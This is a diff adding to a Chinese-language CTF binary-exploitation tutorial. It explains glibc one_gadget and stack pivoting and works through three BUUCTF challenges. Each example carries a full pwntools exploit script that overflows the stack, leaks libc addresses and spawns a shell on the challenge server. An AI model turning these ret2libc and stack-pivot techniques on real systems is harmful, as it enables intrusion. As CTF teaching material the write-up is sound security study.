@@ -1968,6 +1968,114 @@ if __name__ == "__main__":
 
 ```
 
+## one_gadget
+
+其实算一个必须知道的小技巧，不是很大的知识点（大概）
+
+one_gadget 是 glibc 库里一个非常特殊的代码片段，仅调用单个地址就可以直接获得 shell，其实现伪代码可以简单理解为：
+
+```
+void magic_gadgets(){
+	if (constraints_satisfied){//约束条件检查
+		execve("/bin/sh",0,0);
+		exit(0);
+	}
+}
+```
+
+使用 one_gadget 工具，可以对 libc 文件扫描算出所有的这些现成的、直接能拿 Shell 的代码片段，**距离 libc 基址的相对偏移量**。（也就是说我们首先要 ret2libc）
+
+在以下三种情况中可以尝试使用 one_gadget:
+
+* 溢出空间极其狭小：如果题目只能覆盖 old rbp 和 返回地址，那么纯 ROP 链就不太合适了，可以尝试使用 one_gadget。
+
+* 缺少关键的 Gadget 寄存器：如果 ROPgadget 工具找不到 `pop rdi;ret` 这种至关重要的寄存器，或者缺少 system 函数时。
+
+* 栈环境被严格限制： 遇到沙箱（Sandbox）或者某些严苛的代码审查，传统 ROP 链会被拦截，而 One Gadget 直接在 libc 内部跳转，隐蔽性极强。
+
+### 使用技巧
+
+one_gadget 通常有 Constraints（约束条件）。
+
+例如：
+
+* `rax == NULL` （跳转过去的瞬间，rax 寄存器必须是 0）
+
+* `[rsp+0x30] == NULL` （跳转过去的瞬间，栈顶往下 0x30 的位置必须是 0）
+
+* `r12 == NULL` 等等...
+
+一般使用时，要么刻意构造（如 在特定位置 [rsp+0x30] 处写入 0），要么前置 gadget 铺垫（如 `xor rax rax;ret` 使 rax 等于 0），要么 **玄学抽卡**（一个个暴力试哈哈）
+
+#### 例题 1：ciscn_2019_c_1
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_c_1)
+
+<img width="880" height="485" alt="image" src="https://github.com/user-attachments/assets/b1d9274b-982b-4c3b-bfae-9e7a06d3fd88" />
+
+这个题在 ret2libc 里正常做法，下面是 one_gadget 做法，更加简洁：
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 26565
+io = remote(host,port)
+elf = ELF("./ciscn_2019_c_1")
+libc = ELF("./libc-2.27.so")
+offset = 0x57
+padding = b'\0' + b"A"*offset
+pop_rdi_ret = 0x400c83
+ret = 0x400c84
+encrypt = 0x4009A0
+puts_got = elf.got['puts']
+puts_plt = elf.plt['puts']
+payload_1 = padding + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt)
+
+def main():
+    io.recvuntil(b"Input your choice!\n")
+    io.sendline(b"1")
+    io.recvuntil(b"Input your Plaintext to be encrypted\n")
+    io.sendline(payload_1)
+    puts_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))    
+    print(hex(puts_addr))   # 0x7f32720c99c0 → libc6_2.27-3ubuntu1_amd64
+    libc_base = puts_addr - libc.sym['puts']
+    one_gadget_offset = 0x4f322
+    one_gadget = libc_base + one_gadget_offset
+    payload_2 = b'\0' + b'A'*offset + p64(one_gadget)
+    io.recvuntil(b"Input your Plaintext to be encrypted\n")
+    io.sendline(payload_2)
+    io.interactive()
+    
+if __name__ == "__main__":
+    main()
+
+
+# └─$ one_gadget libc-2.27.so
+# 0x4f2be execve("/bin/sh", rsp+0x40, environ)
+# constraints:
+#   address rsp+0x50 is writable
+#   rsp & 0xf == 0
+#   rcx == NULL || {rcx, "-c", r12, NULL} is a valid argv
+
+# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
+# constraints:
+#   address rsp+0x50 is writable
+#   rsp & 0xf == 0
+#   rcx == NULL || {rcx, rax, r12, NULL} is a valid argv
+
+# 0x4f322 execve("/bin/sh", rsp+0x40, environ)
+# constraints:
+#   [rsp+0x40] == NULL || {[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...} is a valid argv
+
+# 0x10a38c execve("/bin/sh", rsp+0x70, environ)
+# constraints:
+#   [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
+```
+
+
 ## SROP
 
 当我们做 ROP 题目时，偶尔发现找 `pop rdi; ret` 很容易，但是找 `pop rdx; ret` 往往不简单。
@@ -2430,7 +2538,7 @@ if __name__ == "__main__":
 
 接着就是正常的 rop 链了。
 
-#### ciscn_2019_es_2
+#### 例题 1：ciscn_2019_es_2
 
 [BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_es_2)
 
@@ -2480,3 +2588,132 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
+#### 例题 2：[Black Watch 入群题]PWN
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#[Black%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98]PWN)
+
+<img width="2558" height="641" alt="image" src="https://github.com/user-attachments/assets/125ac065-5df5-4fcc-80d6-b1b353cf99f7" />
+
+发现这个题有一个全局变量 s 可以写入，它写在 bss 段上，没有开 PIE，地址固定。
+
+<img width="2550" height="1002" alt="image" src="https://github.com/user-attachments/assets/210723ec-2a78-41e5-97c3-ea535c87461f" />
+
+于是我们可以考虑把 ROP 链写在 s 上，然而发现并没有 system。
+
+所以考虑第一次栈迁移，泄露 write 以 ret2libc，然后返回 main 函数，第二次栈迁移 getshell。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 26018
+io = remote(host,port)
+# io = process("./spwn")
+elf = ELF("./spwn")
+libc = ELF("./libc-2.23.so")
+main_addr = 0x8048513
+bss = 0x804A300
+write_plt = elf.plt['write']
+write_got = elf.got['write']
+vuln = 0x804849B
+leave_ret = 0x8048511
+
+def main():
+    io.recvuntil(b"Hello good Ctfer!\n")
+    io.recvuntil(b"What is your name?")
+    payload_1 = b"meow" + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(0x400)
+    io.send(payload_1)
+    io.recvuntil(b"What do you want to say?")
+    go_bss = b'A'*0x18 + p32(bss) + p32(leave_ret)
+    io.send(go_bss)
+    leak_data = io.recvn(4)
+    write_addr = u32(leak_data)
+    print(hex(write_addr))      # 0xf7e8fb50
+    io.recvuntil(b"Hello good Ctfer!\n")
+    io.recvuntil(b"What is your name?")
+    libc_base = write_addr - libc.sym['write']
+    system = libc_base + libc.sym['system']
+    binsh = bss + 0x10
+    payload_2 = b"meow" + p32(system) + p32(0) + p32(binsh) + b"/bin/sh\x00"
+    io.send(payload_2)
+    # gdb.attach(io)
+    io.recvuntil(b"What do you want to say?")
+    io.send(go_bss)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+#### gyctf_2020_borrowstack
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#gyctf_2020_borrowstack)
+
+最初我认为她很普通。
+
+总之看起来和上一道题差不多，只不过上一道题是先输入到 bss 段，然后再触发栈溢出。
+
+这道题是先栈溢出，然后再输入到 bss 段，不过这一点其实没什么差别，栈溢出与栈偏移不是输入就即刻发生的，而是遇到 ret 之后再发生的。
+
+然而看她的 bss 段，`.bss:0000000000601080 ??                                bank db    ? ;` 其实离上面的 got 表一类不可写数据挺近的，考虑到栈向低地址生长，执行 system 或 puts 时会申请大量局部变量，可能跑到 got 上，所以我们必须先垫几个 ret 把 bss 抬高。
+
+```
+payload2 = p64(ret_addr)*20 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)         # ret 即 pop rip，将 rsp 抬高，放置访问到 got 表等不可写信息
+```
+
+然后我就 ROP 了半天，死活也不能打通 system，最后找了找题解，发现可以用 onegadget 就过了，怀疑是因为 system 会开非常多的局部变量，如果在 bss 段再次进行一次 ROP，那么 rsp 就会跑到 got 上去，导致错误。
+
+但是如果我们在 main 函数进行 onegadget，虽然 main 函数只有 8 的溢出空间，不能 ROP，但是 main 在真实栈上，有几 MB 的深度，所以可以执行。
+
+```
+# Based on writeup provided by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+# io = process("./gyctf_2020_borrowstack")
+io = remote('node5.buuoj.cn', 26496)
+elf = ELF("./gyctf_2020_borrowstack")
+libc = ELF("./libc.so")
+
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+leave_ret = 0x400699
+bank_addr = 0x601080
+pop_rdi_ret = 0x400703
+ret_addr = 0x400704
+main_addr = 0x400626
+
+def main():
+    io.recvuntil(b"want\n")
+    
+    payload_1 = b'a' * 0x60 + p64(bank_addr) + p64(leave_ret)
+    io.send(payload_1)
+    io.recvuntil(b"Done!You can check and use your borrow stack now!\n")
+
+    payload2 = p64(ret_addr)*20 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)         # ret 即 pop rip，将 rsp 抬高，放置访问到 got 表等不可写信息
+    io.send(payload2)
+    leak_data = io.recvline().strip(b'\n')
+    puts_addr = u64(leak_data.ljust(8,b'\x00'))
+    print("\n[+] Leak puts:",hex(puts_addr))
+    libc_base = puts_addr - libc.sym['puts']
+    one_gadget_offset = 0x4526a 
+    one_gadget = libc_base + one_gadget_offset
+    print("\n[+] Libc Base:", hex(libc_base))
+    print("\n[+] One Gadget:", hex(one_gadget))
+    
+    io.recvuntil(b"want\n")
+    payload3 = b'a' * 0x60 + p64(0) + p64(one_gadget)
+    io.send(payload3)
+    io.recvuntil(b"Done!You can check and use your borrow stack now!\n")
+    io.send(b'1') # 随便塞个字符让 read 返回，从而让 main 函数走到结尾触发 shell   
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
